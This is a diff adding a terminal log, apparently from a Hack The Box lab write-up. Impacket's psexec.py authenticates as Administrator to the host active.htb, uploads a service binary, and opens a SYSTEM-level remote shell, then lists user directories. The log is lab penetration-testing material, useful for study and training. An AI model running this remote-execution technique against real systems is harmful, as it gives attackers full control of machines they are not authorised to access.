@@ -1,0 +1,38 @@
+#psexec.py active.htb/Administrator@10.10.10.100
+
+Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.10.10.100.....
+[*] Found writable share ADMIN$
+[*] Uploading file cYYhPhHZ.exe
+[*] Opening SVCManager on 10.10.10.100.....
+[*] Creating service oois on 10.10.10.100.....
+[*] Starting service oois.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>cd ..
+
+C:\Windows>cd c:/Users
+
+c:\Users>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2AF3-72E4
+
+ Directory of c:\Users
+
+21/07/2018  04:39 úú    <DIR>          .
+21/07/2018  04:39 úú    <DIR>          ..
+16/07/2018  12:14 úú    <DIR>          Administrator
+14/07/2009  06:57 ºú    <DIR>          Public
+21/07/2018  05:16 úú    <DIR>          SVC_TGS
+               0 File(s)              0 bytes
+               5 Dir(s)  20.288.229.376 bytes free
